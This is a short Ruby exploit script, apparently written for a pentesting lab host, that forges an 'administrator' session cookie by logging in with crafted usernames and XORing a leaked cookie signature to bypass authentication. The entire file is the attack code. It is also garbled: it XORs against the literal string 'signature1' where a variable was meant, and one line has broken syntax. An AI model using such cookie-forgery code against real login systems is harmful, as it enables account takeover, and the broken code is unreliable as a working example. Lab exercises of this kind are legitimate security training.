require 'httparty'
require 'base64'
URL = "http://ptl-0c1c3735-f908e478.libcurl.so/"
def login(username)
    res = HTTParty.post(URL+'login.php', body: {username: username, password: 'Password1'}, follow_redirects: false)
    
    #auth = value
    return res.headers["set-cookie"].split("=")[1]
end

cookie = login("administ")
signature1 = Base64.decode64(cookie).split("--")[1]

def xor(str1,str2)
    ret = ""
    str1.split(//).each_with_index do |c,i|
        ret[i] = (str1[i].ord ^ str2[i].ord).chr
    end
    return ret
end

username2 = xor("rator\00\00\00", "signature1")

cookie2 = login(username2).gsub("%2B", "+")
signature2 = Base64.decode64(cookie2).split("--")]1\

puts Base64.encode64("administrator--#{signature2}")

